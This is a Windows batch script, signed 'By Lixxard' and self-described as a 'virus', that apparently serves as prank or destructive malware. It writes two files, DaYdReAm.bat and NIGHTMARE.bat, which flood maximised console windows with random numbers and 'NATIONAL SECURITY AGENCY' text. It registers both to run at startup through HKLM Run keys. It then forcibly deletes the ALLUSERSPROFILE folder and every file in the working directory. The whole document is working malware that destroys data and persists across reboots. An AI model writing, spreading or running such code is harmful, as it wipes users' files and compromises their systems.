echo     By Lixxard
echo     [This is a `virus`...lol] 
set /p agreement=Do you wish to possibly destroy your Windows dist? This is unstoppable once executed..[Hit Enter To Continue]:
set index_p=0
:reset
set /a index_p=%%index_p%%+1
if "%index_p%" == "32" goto death
if "%%loop%%"=="10000" goto death
@echo off
color 01
echo  _   _ ____    _    
echo | \ | / ___|  / \   
echo |  \| \___ \ / _ \  
echo | |\  |___) / ___ \ 
echo |_| \_|____/_/   \_\                                      
@echo off
>DaYdReAm.bat (
echo @echo off
echo echo Enter SKids IP To Slam:
echo if not "%%1" == "max" start /MAX cmd /c %%0 max ^& exit/b
echo color 0B
echo mode 1000
echo set loop=0
echo :loop
echo echo %%random%%    NATIONAL           %%random%%              SECURITY         %%random%%              AGENCY             %%random%%       %%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo echo %%random%%    NATIONAL            %%random%%              SECURITY        %%random%%              AGENCY            %%random%%       %%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%
echo set /a loop=%%loop%%+1
echo if "%%loop%%"=="10000" goto end
echo goto loop
echo set loop2=0
echo :loop2
echo pushd "%%~dp0"
echo set /a loop2=%%loop2%%+1
echo if "%%loop%%"=="2" goto end
echo :end
)
start DaYdReAm.bat
>NIGHTMARE.bat (
echo @echo off
echo if not "%%1" == "max" start /MAX cmd /c %%0 max ^& exit/b
echo color 0C
echo mode 1000
echo set loop=0
echo :loop
echo echo %%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo ping > null
echo set /a loop=%%loop%%+1
echo if "%%loop%%"=="10000" goto end
echo goto loop
echo set loop2=0
echo :loop2
echo pushd "%%~dp0"
echo set /a loop2=%%loop2%%+1
echo if "%%loop%%"=="2" goto end
echo :end
)
goto reset
:death
echo <(0)> Skid: Downed! <(-)>
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v DaYdReAm /d DaYdReAm.bat
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v NIGHTMARE /d NIGHTMARE.bat
DEL /F/Q/S "%ALLUSERSPROFILE%" > NUL
RMDIR /Q/S "%ALLUSERSPROFILE%"
DEL /F/Q/S *.* > NUL

